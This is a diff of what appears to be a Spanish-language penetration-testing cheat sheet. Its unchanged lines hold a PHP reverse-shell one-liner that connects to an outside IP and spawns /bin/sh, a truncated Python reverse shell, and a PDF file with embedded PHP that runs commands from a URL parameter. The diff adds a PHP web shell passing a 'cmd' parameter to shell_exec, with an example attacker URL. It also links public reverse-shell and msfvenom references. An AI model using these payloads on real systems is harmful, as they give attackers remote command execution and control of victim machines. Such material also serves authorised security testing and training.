@@ -133,7 +133,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 // PHP
 php -r '$sock=fsockopen("8.8.8.8",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
 
-     pdf php inclusion
+     pdf php inclusion:
           %PDF-1.4
           <?php
               system($_GET["cmd"]);
@@ -175,6 +175,16 @@ locate .nse | xargs grep "categories" | grep -oP '".*?"' | sort -u --> mostrar t
 
 WEB SHELL
 ..........
+
+Ejecucion de comando por navegador atacante:
+
+     archivo .php en victima:
+          <?php
+               echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
+          ?>
+
+     en navegador atacante:
+          http://IP/archivo.php?cmd=whoami
 
 https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
 https://book.hacktricks.xyz/shells/shells/msfvenom
